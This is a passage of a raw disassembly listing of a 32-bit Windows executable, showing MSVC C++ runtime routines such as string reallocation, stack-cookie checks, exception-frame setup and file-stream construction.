  405aa9:	0f 42 f0             	cmovb  %eax,%esi
  405aac:	33 c9                	xor    %ecx,%ecx
  405aae:	8b c6                	mov    %esi,%eax
  405ab0:	83 c0 01             	add    $0x1,%eax
  405ab3:	0f 92 c1             	setb   %cl
  405ab6:	f7 d9                	neg    %ecx
  405ab8:	0b c8                	or     %eax,%ecx
  405aba:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  405ac0:	72 2a                	jb     0x405aec
  405ac2:	8d 41 23             	lea    0x23(%ecx),%eax
  405ac5:	3b c1                	cmp    %ecx,%eax
  405ac7:	0f 86 dc 00 00 00    	jbe    0x405ba9
  405acd:	50                   	push   %eax
  405ace:	e8 b4 0f 00 00       	call   0x406a87
  405ad3:	83 c4 04             	add    $0x4,%esp
  405ad6:	85 c0                	test   %eax,%eax
  405ad8:	0f 84 97 00 00 00    	je     0x405b75
  405ade:	8b 55 f8             	mov    -0x8(%ebp),%edx
  405ae1:	8d 78 23             	lea    0x23(%eax),%edi
  405ae4:	83 e7 e0             	and    $0xffffffe0,%edi
  405ae7:	89 47 fc             	mov    %eax,-0x4(%edi)
  405aea:	eb 16                	jmp    0x405b02
  405aec:	85 c9                	test   %ecx,%ecx
  405aee:	74 10                	je     0x405b00
  405af0:	51                   	push   %ecx
  405af1:	e8 91 0f 00 00       	call   0x406a87
  405af6:	8b 55 f8             	mov    -0x8(%ebp),%edx
  405af9:	83 c4 04             	add    $0x4,%esp
  405afc:	8b f8                	mov    %eax,%edi
  405afe:	eb 02                	jmp    0x405b02
  405b00:	33 ff                	xor    %edi,%edi
  405b02:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405b05:	89 43 10             	mov    %eax,0x10(%ebx)
  405b08:	8b 45 14             	mov    0x14(%ebp),%eax
  405b0b:	89 73 14             	mov    %esi,0x14(%ebx)
  405b0e:	8d 34 3a             	lea    (%edx,%edi,1),%esi
  405b11:	03 c6                	add    %esi,%eax
  405b13:	83 7d f4 10          	cmpl   $0x10,-0xc(%ebp)
  405b17:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405b1a:	52                   	push   %edx
  405b1b:	72 5e                	jb     0x405b7b
  405b1d:	8b 33                	mov    (%ebx),%esi
  405b1f:	56                   	push   %esi
  405b20:	57                   	push   %edi
  405b21:	e8 9b 1e 00 00       	call   0x4079c1
  405b26:	ff 75 14             	push   0x14(%ebp)
  405b29:	8b 45 f8             	mov    -0x8(%ebp),%eax
  405b2c:	ff 75 f0             	push   -0x10(%ebp)
  405b2f:	03 c7                	add    %edi,%eax
  405b31:	50                   	push   %eax
  405b32:	e8 8a 1e 00 00       	call   0x4079c1
  405b37:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405b3a:	83 c4 18             	add    $0x18,%esp
  405b3d:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  405b40:	41                   	inc    %ecx
  405b41:	c6 00 00             	movb   $0x0,(%eax)
  405b44:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  405b4a:	72 12                	jb     0x405b5e
  405b4c:	8b 56 fc             	mov    -0x4(%esi),%edx
  405b4f:	83 c1 23             	add    $0x23,%ecx
  405b52:	2b f2                	sub    %edx,%esi
  405b54:	8d 46 fc             	lea    -0x4(%esi),%eax
  405b57:	83 f8 1f             	cmp    $0x1f,%eax
  405b5a:	77 19                	ja     0x405b75
  405b5c:	8b f2                	mov    %edx,%esi
  405b5e:	51                   	push   %ecx
  405b5f:	56                   	push   %esi
  405b60:	e8 57 0f 00 00       	call   0x406abc
  405b65:	83 c4 08             	add    $0x8,%esp
  405b68:	89 3b                	mov    %edi,(%ebx)
  405b6a:	8b c3                	mov    %ebx,%eax
  405b6c:	5f                   	pop    %edi
  405b6d:	5e                   	pop    %esi
  405b6e:	5b                   	pop    %ebx
  405b6f:	8b e5                	mov    %ebp,%esp
  405b71:	5d                   	pop    %ebp
  405b72:	c2 10 00             	ret    $0x10
  405b75:	ff 15 80 91 40 00    	call   *0x409180
  405b7b:	53                   	push   %ebx
  405b7c:	57                   	push   %edi
  405b7d:	e8 3f 1e 00 00       	call   0x4079c1
  405b82:	ff 75 14             	push   0x14(%ebp)
  405b85:	ff 75 f0             	push   -0x10(%ebp)
  405b88:	56                   	push   %esi
  405b89:	e8 33 1e 00 00       	call   0x4079c1
  405b8e:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405b91:	83 c4 18             	add    $0x18,%esp
  405b94:	c6 00 00             	movb   $0x0,(%eax)
  405b97:	8b c3                	mov    %ebx,%eax
  405b99:	89 3b                	mov    %edi,(%ebx)
  405b9b:	5f                   	pop    %edi
  405b9c:	5e                   	pop    %esi
  405b9d:	5b                   	pop    %ebx
  405b9e:	8b e5                	mov    %ebp,%esp
  405ba0:	5d                   	pop    %ebp
  405ba1:	c2 10 00             	ret    $0x10
  405ba4:	e8 c7 b5 ff ff       	call   0x401170
  405ba9:	e8 22 b5 ff ff       	call   0x4010d0
  405bae:	cc                   	int3
  405baf:	cc                   	int3
  405bb0:	56                   	push   %esi
  405bb1:	8b f1                	mov    %ecx,%esi
  405bb3:	ff 76 18             	push   0x18(%esi)
  405bb6:	e8 91 0b 00 00       	call   0x40674c
  405bbb:	8b 4e 14             	mov    0x14(%esi),%ecx
  405bbe:	83 f9 08             	cmp    $0x8,%ecx
  405bc1:	72 2d                	jb     0x405bf0
  405bc3:	8b 06                	mov    (%esi),%eax
  405bc5:	8d 0c 4d 02 00 00 00 	lea    0x2(,%ecx,2),%ecx
  405bcc:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  405bd2:	72 12                	jb     0x405be6
  405bd4:	8b 50 fc             	mov    -0x4(%eax),%edx
  405bd7:	83 c1 23             	add    $0x23,%ecx
  405bda:	2b c2                	sub    %edx,%eax
  405bdc:	83 c0 fc             	add    $0xfffffffc,%eax
  405bdf:	83 f8 1f             	cmp    $0x1f,%eax
  405be2:	77 21                	ja     0x405c05
  405be4:	8b c2                	mov    %edx,%eax
  405be6:	51                   	push   %ecx
  405be7:	50                   	push   %eax
  405be8:	e8 cf 0e 00 00       	call   0x406abc
  405bed:	83 c4 08             	add    $0x8,%esp
  405bf0:	33 c0                	xor    %eax,%eax
  405bf2:	c7 46 10 00 00 00 00 	movl   $0x0,0x10(%esi)
  405bf9:	c7 46 14 07 00 00 00 	movl   $0x7,0x14(%esi)
  405c00:	66 89 06             	mov    %ax,(%esi)
  405c03:	5e                   	pop    %esi
  405c04:	c3                   	ret
  405c05:	ff 15 80 91 40 00    	call   *0x409180
  405c0b:	cc                   	int3
  405c0c:	cc                   	int3
  405c0d:	cc                   	int3
  405c0e:	cc                   	int3
  405c0f:	cc                   	int3
  405c10:	8b 09                	mov    (%ecx),%ecx
  405c12:	85 c9                	test   %ecx,%ecx
  405c14:	74 06                	je     0x405c1c
  405c16:	8b 01                	mov    (%ecx),%eax
  405c18:	6a 01                	push   $0x1
  405c1a:	ff 10                	call   *(%eax)
  405c1c:	c3                   	ret
  405c1d:	cc                   	int3
  405c1e:	cc                   	int3
  405c1f:	cc                   	int3
  405c20:	55                   	push   %ebp
  405c21:	8b ec                	mov    %esp,%ebp
  405c23:	6a ff                	push   $0xffffffff
  405c25:	68 0a 80 40 00       	push   $0x40800a
  405c2a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  405c30:	50                   	push   %eax
  405c31:	83 ec 20             	sub    $0x20,%esp
  405c34:	a1 04 c0 40 00       	mov    0x40c004,%eax
  405c39:	33 c5                	xor    %ebp,%eax
  405c3b:	89 45 f0             	mov    %eax,-0x10(%ebp)
  405c3e:	53                   	push   %ebx
  405c3f:	56                   	push   %esi
  405c40:	57                   	push   %edi
  405c41:	50                   	push   %eax
  405c42:	8d 45 f4             	lea    -0xc(%ebp),%eax
  405c45:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  405c4b:	8b f1                	mov    %ecx,%esi
  405c4d:	89 75 e0             	mov    %esi,-0x20(%ebp)
  405c50:	8b 5d 08             	mov    0x8(%ebp),%ebx
  405c53:	8d 4e 78             	lea    0x78(%esi),%ecx
  405c56:	89 75 dc             	mov    %esi,-0x24(%ebp)
  405c59:	c7 45 e0 00 00 00 00 	movl   $0x0,-0x20(%ebp)
  405c60:	c7 06 bc 95 40 00    	movl   $0x4095bc,(%esi)
  405c66:	c7 46 10 10 95 40 00 	movl   $0x409510,0x10(%esi)
  405c6d:	ff 15 cc 90 40 00    	call   *0x4090cc
  405c73:	6a 00                	push   $0x0
  405c75:	8d 7e 18             	lea    0x18(%esi),%edi
  405c78:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  405c7f:	57                   	push   %edi
  405c80:	8b ce                	mov    %esi,%ecx
  405c82:	c7 45 e0 01 00 00 00 	movl   $0x1,-0x20(%ebp)
  405c89:	ff 15 c8 90 40 00    	call   *0x4090c8
  405c8f:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  405c96:	8b 06                	mov    (%esi),%eax
  405c98:	8b 40 04             	mov    0x4(%eax),%eax
  405c9b:	c7 04 06 b8 95 40 00 	movl   $0x4095b8,(%esi,%eax,1)
  405ca2:	8b 06                	mov    (%esi),%eax
  405ca4:	8b 48 04             	mov    0x4(%eax),%ecx
  405ca7:	89 7d ec             	mov    %edi,-0x14(%ebp)
  405caa:	8d 41 88             	lea    -0x78(%ecx),%eax
  405cad:	89 44 31 fc          	mov    %eax,-0x4(%ecx,%esi,1)
  405cb1:	8b cf                	mov    %edi,%ecx
  405cb3:	ff 15 d4 90 40 00    	call   *0x4090d4
  405cb9:	c6 45 fc 02          	movb   $0x2,-0x4(%ebp)
  405cbd:	8b cf                	mov    %edi,%ecx
  405cbf:	c7 07 44 95 40 00    	movl   $0x409544,(%edi)
  405cc5:	c6 47 48 00          	movb   $0x0,0x48(%edi)
  405cc9:	c6 47 3d 00          	movb   $0x0,0x3d(%edi)
  405ccd:	ff 15 b8 90 40 00    	call   *0x4090b8
  405cd3:	a1 90 c7 40 00       	mov    0x40c790,%eax
  405cd8:	8b 0d 94 c7 40 00    	mov    0x40c794,%ecx
  405cde:	c7 47 4c 00 00 00 00 	movl   $0x0,0x4c(%edi)
  405ce5:	89 47 40             	mov    %eax,0x40(%edi)
  405ce8:	89 4f 44             	mov    %ecx,0x44(%edi)
  405ceb:	c7 47 38 00 00 00 00 	movl   $0x0,0x38(%edi)
  405cf2:	c6 45 fc 03          	movb   $0x3,-0x4(%ebp)
  405cf6:	83 7f 4c 00          	cmpl   $0x0,0x4c(%edi)
  405cfa:	0f 85 dc 00 00 00    	jne    0x405ddc
  405d00:	6a 40                	push   $0x40
  405d02:	6a 27                	push   $0x27
  405d04:	53                   	push   %ebx
  405d05:	ff 15 ec 90 40 00    	call   *0x4090ec
  405d0b:	8b d8                	mov    %eax,%ebx
  405d0d:	83 c4 0c             	add    $0xc,%esp
  405d10:	85 db                	test   %ebx,%ebx
  405d12:	0f 84 c4 00 00 00    	je     0x405ddc
  405d18:	8b cf                	mov    %edi,%ecx
  405d1a:	c6 47 48 01          	movb   $0x1,0x48(%edi)
  405d1e:	c6 47 3d 00          	movb   $0x0,0x3d(%edi)
  405d22:	ff 15 b8 90 40 00    	call   *0x4090b8
  405d28:	8d 45 ec             	lea    -0x14(%ebp),%eax
  405d2b:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%ebp)
  405d32:	50                   	push   %eax
  405d33:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  405d36:	c7 45 e4 00 00 00 00 	movl   $0x0,-0x1c(%ebp)
  405d3d:	50                   	push   %eax
  405d3e:	8d 45 e8             	lea    -0x18(%ebp),%eax
  405d41:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%ebp)
  405d48:	50                   	push   %eax
  405d49:	53                   	push   %ebx
  405d4a:	ff 15 d8 91 40 00    	call   *0x4091d8
  405d50:	8b 45 e8             	mov    -0x18(%ebp),%eax
  405d53:	83 c4 10             	add    $0x10,%esp
  405d56:	8b 0d 94 c7 40 00    	mov    0x40c794,%ecx
  405d5c:	89 47 0c             	mov    %eax,0xc(%edi)
  405d5f:	89 47 10             	mov    %eax,0x10(%edi)
  405d62:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  405d65:	89 47 1c             	mov    %eax,0x1c(%edi)
  405d68:	89 47 20             	mov    %eax,0x20(%edi)
  405d6b:	8b 45 ec             	mov    -0x14(%ebp),%eax
  405d6e:	89 47 2c             	mov    %eax,0x2c(%edi)
  405d71:	89 47 30             	mov    %eax,0x30(%edi)
  405d74:	a1 90 c7 40 00       	mov    0x40c790,%eax
  405d79:	89 47 40             	mov    %eax,0x40(%edi)
  405d7c:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  405d7f:	89 4f 44             	mov    %ecx,0x44(%edi)
  405d82:	8b cf                	mov    %edi,%ecx
  405d84:	50                   	push   %eax
  405d85:	89 5f 4c             	mov    %ebx,0x4c(%edi)
  405d88:	c7 47 38 00 00 00 00 	movl   $0x0,0x38(%edi)
  405d8f:	ff 15 d0 90 40 00    	call   *0x4090d0
  405d95:	8b c8                	mov    %eax,%ecx
  405d97:	c6 45 fc 04          	movb   $0x4,-0x4(%ebp)
  405d9b:	e8 60 f3 ff ff       	call   0x405100
  405da0:	8b d8                	mov    %eax,%ebx
  405da2:	8b cb                	mov    %ebx,%ecx
  405da4:	ff 15 94 90 40 00    	call   *0x409094
  405daa:	84 c0                	test   %al,%al
  405dac:	74 09                	je     0x405db7
  405dae:	c7 47 38 00 00 00 00 	movl   $0x0,0x38(%edi)
  405db5:	eb 0b                	jmp    0x405dc2
  405db7:	8b cf                	mov    %edi,%ecx
  405db9:	89 5f 38             	mov    %ebx,0x38(%edi)
  405dbc:	ff 15 b8 90 40 00    	call   *0x4090b8
  405dc2:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  405dc5:	85 c9                	test   %ecx,%ecx
  405dc7:	74 24                	je     0x405ded
  405dc9:	8b 01                	mov    (%ecx),%eax
  405dcb:	ff 50 08             	call   *0x8(%eax)
  405dce:	85 c0                	test   %eax,%eax
  405dd0:	74 1b                	je     0x405ded
  405dd2:	8b 10                	mov    (%eax),%edx
  405dd4:	8b c8                	mov    %eax,%ecx
  405dd6:	6a 01                	push   $0x1
  405dd8:	ff 12                	call   *(%edx)
  405dda:	eb 11                	jmp    0x405ded
  405ddc:	8b 06                	mov    (%esi),%eax
  405dde:	6a 00                	push   $0x0
  405de0:	6a 02                	push   $0x2
  405de2:	8b 48 04             	mov    0x4(%eax),%ecx
  405de5:	03 ce                	add    %esi,%ecx
  405de7:	ff 15 ac 90 40 00    	call   *0x4090ac
  405ded:	8b c6                	mov    %esi,%eax
  405def:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  405df2:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  405df9:	59                   	pop    %ecx
  405dfa:	5f                   	pop    %edi
  405dfb:	5e                   	pop    %esi
  405dfc:	5b                   	pop    %ebx
  405dfd:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  405e00:	33 cd                	xor    %ebp,%ecx
  405e02:	e8 72 0c 00 00       	call   0x406a79
  405e07:	8b e5                	mov    %ebp,%esp
  405e09:	5d                   	pop    %ebp
  405e0a:	c2 10 00             	ret    $0x10
  405e0d:	cc                   	int3
  405e0e:	cc                   	int3
  405e0f:	cc                   	int3
  405e10:	55                   	push   %ebp
  405e11:	8b ec                	mov    %esp,%ebp
  405e13:	6a ff                	push   $0xffffffff
  405e15:	68 5e 80 40 00       	push   $0x40805e
  405e1a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  405e20:	50                   	push   %eax
  405e21:	83 ec 24             	sub    $0x24,%esp
  405e24:	53                   	push   %ebx
  405e25:	56                   	push   %esi
  405e26:	57                   	push   %edi
  405e27:	a1 04 c0 40 00       	mov    0x40c004,%eax
  405e2c:	33 c5                	xor    %ebp,%eax
  405e2e:	50                   	push   %eax
  405e2f:	8d 45 f4             	lea    -0xc(%ebp),%eax
  405e32:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  405e38:	8b f9                	mov    %ecx,%edi
  405e3a:	89 7d ec             	mov    %edi,-0x14(%ebp)
  405e3d:	89 7d d4             	mov    %edi,-0x2c(%ebp)
  405e40:	c7 45 e4 00 00 00 00 	movl   $0x0,-0x1c(%ebp)
  405e47:	8b 5d 08             	mov    0x8(%ebp),%ebx
  405e4a:	8b 75 0c             	mov    0xc(%ebp),%esi
  405e4d:	89 5d d8             	mov    %ebx,-0x28(%ebp)
  405e50:	89 75 dc             	mov    %esi,-0x24(%ebp)
  405e53:	89 5d e8             	mov    %ebx,-0x18(%ebp)
  405e56:	e8 5c 07 00 00       	call   0x4065b7
  405e5b:	89 45 ec             	mov    %eax,-0x14(%ebp)
  405e5e:	c7 07 00 00 00 00    	movl   $0x0,(%edi)
  405e64:	c7 47 10 00 00 00 00 	movl   $0x0,0x10(%edi)
  405e6b:	c7 47 14 00 00 00 00 	movl   $0x0,0x14(%edi)
  405e72:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  405e79:	c7 47 10 00 00 00 00 	movl   $0x0,0x10(%edi)
  405e80:	c7 47 14 0f 00 00 00 	movl   $0xf,0x14(%edi)
  405e87:	c6 45 fc 00          	movb   $0x0,-0x4(%ebp)
  405e8b:	c6 07 00             	movb   $0x0,(%edi)
  405e8e:	c7 45 e4 02 00 00 00 	movl   $0x2,-0x1c(%ebp)
  405e95:	85 f6                	test   %esi,%esi
  405e97:	0f 84 9d 00 00 00    	je     0x405f3a
  405e9d:	81 fe ff ff ff 7f    	cmp    $0x7fffffff,%esi
  405ea3:	0f 87 a5 00 00 00    	ja     0x405f4e
  405ea9:	6a 00                	push   $0x0
  405eab:	6a 00                	push   $0x0
  405ead:	56                   	push   %esi
  405eae:	53                   	push   %ebx
  405eaf:	50                   	push   %eax
  405eb0:	e8 54 07 00 00       	call   0x406609
  405eb5:	8b d8                	mov    %eax,%ebx
  405eb7:	85 d2                	test   %edx,%edx
  405eb9:	0f 85 94 00 00 00    	jne    0x405f53
  405ebf:	8b 57 10             	mov    0x10(%edi),%edx
  405ec2:	3b da                	cmp    %edx,%ebx
  405ec4:	77 13                	ja     0x405ed9
  405ec6:	83 7f 14 10          	cmpl   $0x10,0x14(%edi)
  405eca:	8b c7                	mov    %edi,%eax
  405ecc:	72 02                	jb     0x405ed0
  405ece:	8b 07                	mov    (%edi),%eax
  405ed0:	89 5f 10             	mov    %ebx,0x10(%edi)
  405ed3:	c6 04 18 00          	movb   $0x0,(%eax,%ebx,1)
  405ed7:	eb 45                	jmp    0x405f1e
  405ed9:	8b 47 14             	mov    0x14(%edi),%eax
  405edc:	8b cb                	mov    %ebx,%ecx
  405ede:	2b ca                	sub    %edx,%ecx
  405ee0:	2b c2                	sub    %edx,%eax
  405ee2:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  405ee5:	3b c8                	cmp    %eax,%ecx
  405ee7:	77 28                	ja     0x405f11
  405ee9:	83 7f 14 10          	cmpl   $0x10,0x14(%edi)
  405eed:	8b c7                	mov    %edi,%eax
  405eef:	89 5f 10             	mov    %ebx,0x10(%edi)
  405ef2:	72 02                	jb     0x405ef6
  405ef4:	8b 07                	mov    (%edi),%eax
  405ef6:	51                   	push   %ecx
  405ef7:	8d 34 10             	lea    (%eax,%edx,1),%esi
  405efa:	6a 00                	push   $0x0
  405efc:	56                   	push   %esi
  405efd:	e8 a0 17 00 00       	call   0x4076a2
  405f02:	8b 45 e0             	mov    -0x20(%ebp),%eax
  405f05:	83 c4 0c             	add    $0xc,%esp
  405f08:	c6 04 06 00          	movb   $0x0,(%esi,%eax,1)
  405f0c:	8b 75 dc             	mov    -0x24(%ebp),%esi
  405f0f:	eb 0d                	jmp    0x405f1e
  405f11:	51                   	push   %ecx
  405f12:	51                   	push   %ecx
  405f13:	ff 75 d4             	push   -0x2c(%ebp)
  405f16:	51                   	push   %ecx
  405f17:	8b cf                	mov    %edi,%ecx
  405f19:	e8 d2 f9 ff ff       	call   0x4058f0
  405f1e:	83 7f 14 10          	cmpl   $0x10,0x14(%edi)
  405f22:	8b c7                	mov    %edi,%eax
  405f24:	72 02                	jb     0x405f28
  405f26:	8b 07                	mov    (%edi),%eax
  405f28:	53                   	push   %ebx
  405f29:	50                   	push   %eax
  405f2a:	56                   	push   %esi
  405f2b:	ff 75 d8             	push   -0x28(%ebp)
  405f2e:	ff 75 ec             	push   -0x14(%ebp)
  405f31:	e8 d3 06 00 00       	call   0x406609
  405f36:	85 d2                	test   %edx,%edx
  405f38:	75 20                	jne    0x405f5a
  405f3a:	8b c7                	mov    %edi,%eax
  405f3c:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  405f3f:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  405f46:	59                   	pop    %ecx
  405f47:	5f                   	pop    %edi
  405f48:	5e                   	pop    %esi
  405f49:	5b                   	pop    %ebx
  405f4a:	8b e5                	mov    %ebp,%esp
  405f4c:	5d                   	pop    %ebp
  405f4d:	c3                   	ret
  405f4e:	e8 5d b6 ff ff       	call   0x4015b0
  405f53:	8b ca                	mov    %edx,%ecx
  405f55:	e8 16 ba ff ff       	call   0x401970
  405f5a:	8b ca                	mov    %edx,%ecx
  405f5c:	e8 0f ba ff ff       	call   0x401970
  405f61:	cc                   	int3
  405f62:	cc                   	int3
  405f63:	cc                   	int3
  405f64:	cc                   	int3
  405f65:	cc                   	int3
  405f66:	cc                   	int3
  405f67:	cc                   	int3
  405f68:	cc                   	int3
  405f69:	cc                   	int3
  405f6a:	cc                   	int3
  405f6b:	cc                   	int3
  405f6c:	cc                   	int3
  405f6d:	cc                   	int3
  405f6e:	cc                   	int3
  405f6f:	cc                   	int3
  405f70:	55                   	push   %ebp
  405f71:	8b ec                	mov    %esp,%ebp
  405f73:	6a ff                	push   $0xffffffff
  405f75:	68 80 80 40 00       	push   $0x408080
  405f7a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  405f80:	50                   	push   %eax
  405f81:	83 ec 0c             	sub    $0xc,%esp
  405f84:	a1 04 c0 40 00       	mov    0x40c004,%eax
  405f89:	33 c5                	xor    %ebp,%eax
  405f8b:	89 45 f0             	mov    %eax,-0x10(%ebp)
  405f8e:	56                   	push   %esi
  405f8f:	57                   	push   %edi
  405f90:	50                   	push   %eax
  405f91:	8d 45 f4             	lea    -0xc(%ebp),%eax
  405f94:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  405f9a:	8b f9                	mov    %ecx,%edi
  405f9c:	89 7d ec             	mov    %edi,-0x14(%ebp)
  405f9f:	8b 72 04             	mov    0x4(%edx),%esi
  405fa2:	8b 0a                	mov    (%edx),%ecx
  405fa4:	89 7d ec             	mov    %edi,-0x14(%ebp)
  405fa7:	c7 07 00 00 00 00    	movl   $0x0,(%edi)
  405fad:	c7 47 10 00 00 00 00 	movl   $0x0,0x10(%edi)
  405fb4:	c7 47 14 00 00 00 00 	movl   $0x0,0x14(%edi)
  405fbb:	56                   	push   %esi
  405fbc:	33 c0                	xor    %eax,%eax
  405fbe:	c7 47 10 00 00 00 00 	movl   $0x0,0x10(%edi)
  405fc5:	51                   	push   %ecx
  405fc6:	c7 47 14 07 00 00 00 	movl   $0x7,0x14(%edi)
  405fcd:	8b cf                	mov    %edi,%ecx
  405fcf:	66 89 07             	mov    %ax,(%edi)
  405fd2:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  405fd9:	e8 c2 e6 ff ff       	call   0x4046a0
  405fde:	8b c7                	mov    %edi,%eax
  405fe0:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  405fe3:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  405fea:	59                   	pop    %ecx
  405feb:	5f                   	pop    %edi
  405fec:	5e                   	pop    %esi
  405fed:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  405ff0:	33 cd                	xor    %ebp,%ecx
  405ff2:	e8 82 0a 00 00       	call   0x406a79
  405ff7:	8b e5                	mov    %ebp,%esp
  405ff9:	5d                   	pop    %ebp
  405ffa:	c3                   	ret
  405ffb:	cc                   	int3
  405ffc:	cc                   	int3
  405ffd:	cc                   	int3
  405ffe:	cc                   	int3
  405fff:	cc                   	int3
  406000:	55                   	push   %ebp
  406001:	8b ec                	mov    %esp,%ebp
  406003:	83 e4 f8             	and    $0xfffffff8,%esp
  406006:	83 ec 0c             	sub    $0xc,%esp
  406009:	56                   	push   %esi
  40600a:	6a 05                	push   $0x5
  40600c:	68 6c 94 40 00       	push   $0x40946c
  406011:	ff 75 08             	push   0x8(%ebp)
  406014:	8b f1                	mov    %ecx,%esi
  406016:	89 74 24 14          	mov    %esi,0x14(%esp)
  40601a:	e8 b1 03 00 00       	call   0x4063d0
  40601f:	83 c4 0c             	add    $0xc,%esp
  406022:	8b c6                	mov    %esi,%eax
  406024:	5e                   	pop    %esi
  406025:	8b e5                	mov    %ebp,%esp
  406027:	5d                   	pop    %ebp
  406028:	c3                   	ret
  406029:	cc                   	int3
  40602a:	cc                   	int3
  40602b:	cc                   	int3
  40602c:	cc                   	int3
  40602d:	cc                   	int3
  40602e:	cc                   	int3
  40602f:	cc                   	int3
  406030:	55                   	push   %ebp
  406031:	8b ec                	mov    %esp,%ebp
  406033:	6a ff                	push   $0xffffffff
  406035:	68 c5 80 40 00       	push   $0x4080c5
  40603a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  406040:	50                   	push   %eax
  406041:	83 ec 24             	sub    $0x24,%esp
  406044:	53                   	push   %ebx
  406045:	56                   	push   %esi
  406046:	57                   	push   %edi
  406047:	a1 04 c0 40 00       	mov    0x40c004,%eax
  40604c:	33 c5                	xor    %ebp,%eax
  40604e:	50                   	push   %eax
  40604f:	8d 45 f4             	lea    -0xc(%ebp),%eax
  406052:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  406058:	89 65 f0             	mov    %esp,-0x10(%ebp)
  40605b:	8b f2                	mov    %edx,%esi
  40605d:	89 75 e8             	mov    %esi,-0x18(%ebp)
  406060:	8b d9                	mov    %ecx,%ebx
  406062:	89 5d dc             	mov    %ebx,-0x24(%ebp)
  406065:	8b 46 04             	mov    0x4(%esi),%eax
  406068:	8b 0e                	mov    (%esi),%ecx
  40606a:	8d 50 02             	lea    0x2(%eax),%edx
  40606d:	8d 3c 01             	lea    (%ecx,%eax,1),%edi
  406070:	89 7d d8             	mov    %edi,-0x28(%ebp)
  406073:	3b cf                	cmp    %edi,%ecx
  406075:	74 1a                	je     0x406091
  406077:	8a 66 08             	mov    0x8(%esi),%ah
  40607a:	66 0f 1f 44 00 00    	nopw   0x0(%eax,%eax,1)
  406080:	8a 01                	mov    (%ecx),%al
  406082:	3a c4                	cmp    %ah,%al
  406084:	74 05                	je     0x40608b
  406086:	3a 46 09             	cmp    0x9(%esi),%al
  406089:	75 01                	jne    0x40608c
  40608b:	42                   	inc    %edx
  40608c:	41                   	inc    %ecx
  40608d:	3b cf                	cmp    %edi,%ecx
  40608f:	75 ef                	jne    0x406080
  406091:	8b 03                	mov    (%ebx),%eax
  406093:	33 f6                	xor    %esi,%esi
  406095:	89 75 ec             	mov    %esi,-0x14(%ebp)
  406098:	8b 40 04             	mov    0x4(%eax),%eax
  40609b:	8b 7c 18 20          	mov    0x20(%eax,%ebx,1),%edi
  40609f:	39 74 18 24          	cmp    %esi,0x24(%eax,%ebx,1)
  4060a3:	7c 0e                	jl     0x4060b3
  4060a5:	7f 04                	jg     0x4060ab
  4060a7:	85 ff                	test   %edi,%edi
  4060a9:	74 08                	je     0x4060b3
  4060ab:	3b fa                	cmp    %edx,%edi
  4060ad:	76 04                	jbe    0x4060b3
  4060af:	2b fa                	sub    %edx,%edi
  4060b1:	eb 02                	jmp    0x4060b5
  4060b3:	33 ff                	xor    %edi,%edi
  4060b5:	8b 4c 18 38          	mov    0x38(%eax,%ebx,1),%ecx
  4060b9:	89 5d d0             	mov    %ebx,-0x30(%ebp)
  4060bc:	85 c9                	test   %ecx,%ecx
  4060be:	74 05                	je     0x4060c5
  4060c0:	8b 01                	mov    (%ecx),%eax
  4060c2:	ff 50 04             	call   *0x4(%eax)
  4060c5:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  4060cc:	8b 0b                	mov    (%ebx),%ecx
  4060ce:	8b 41 04             	mov    0x4(%ecx),%eax
  4060d1:	03 c3                	add    %ebx,%eax
  4060d3:	83 78 0c 00          	cmpl   $0x0,0xc(%eax)
  4060d7:	74 04                	je     0x4060dd
  4060d9:	32 c0                	xor    %al,%al
  4060db:	eb 24                	jmp    0x406101
  4060dd:	8b 40 3c             	mov    0x3c(%eax),%eax
  4060e0:	85 c0                	test   %eax,%eax
  4060e2:	74 1b                	je     0x4060ff
  4060e4:	3b c3                	cmp    %ebx,%eax
  4060e6:	74 17                	je     0x4060ff
  4060e8:	8b c8                	mov    %eax,%ecx
  4060ea:	ff 15 b0 90 40 00    	call   *0x4090b0
  4060f0:	8b 0b                	mov    (%ebx),%ecx
  4060f2:	8b 41 04             	mov    0x4(%ecx),%eax
  4060f5:	83 7c 18 0c 00       	cmpl   $0x0,0xc(%eax,%ebx,1)
  4060fa:	0f 94 c0             	sete   %al
  4060fd:	eb 02                	jmp    0x406101
  4060ff:	b0 01                	mov    $0x1,%al
  406101:	88 45 d4             	mov    %al,-0x2c(%ebp)
  406104:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  40610b:	84 c0                	test   %al,%al
  40610d:	75 0a                	jne    0x406119
  40610f:	be 04 00 00 00       	mov    $0x4,%esi
  406114:	e9 85 01 00 00       	jmp    0x40629e
